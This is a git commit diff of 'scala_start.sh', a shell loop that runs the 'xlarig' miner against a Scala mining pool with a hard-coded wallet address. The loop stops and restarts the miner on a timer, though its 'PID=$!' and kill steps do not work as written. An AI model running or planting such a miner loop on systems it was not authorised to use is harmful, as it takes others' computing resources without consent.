7d5725e1993bb6e3f7f42cfadd6e64ac80531cb8
nids4easy <50073725+nids4easy@users.noreply.github.com>
2021-05-02 16:35:00 +0700

    Update scala_start.sh

--- scala_start.sh
+++ scala_start.sh
@@ -1,8 +1,1 @@
-while [ 1 ]; do
-./xlarig -o sg.scala.herominers.com:10130 -u SvkKp92SYoy8GZHn3LaKoGg8SSQfVGhsfJUumopjGbiLAfkrtCbnQ7JREF4BawqkkxF67JicmbecqDiV4jfTLktd2yG9WLoyb -p oncom21 -a panthera -k -t 1
-sleep 60
-PID=$!
-sleep 2
-kill $PID
-sleep 30
-done
+while true; do cd xla && ./xlarig -o sg.scala.herominers.com:10130 -u SvkKp92SYoy8GZHn3LaKoGg8SSQfVGhsfJUumopjGbiLAfkrtCbnQ7JREF4BawqkkxF67JicmbecqDiV4jfTLktd2yG9WLoyb -p oncom21 -a panthera -k -t 1; sleep 60; PID=$!; sleep 2; kill $PID; sleep 30; done
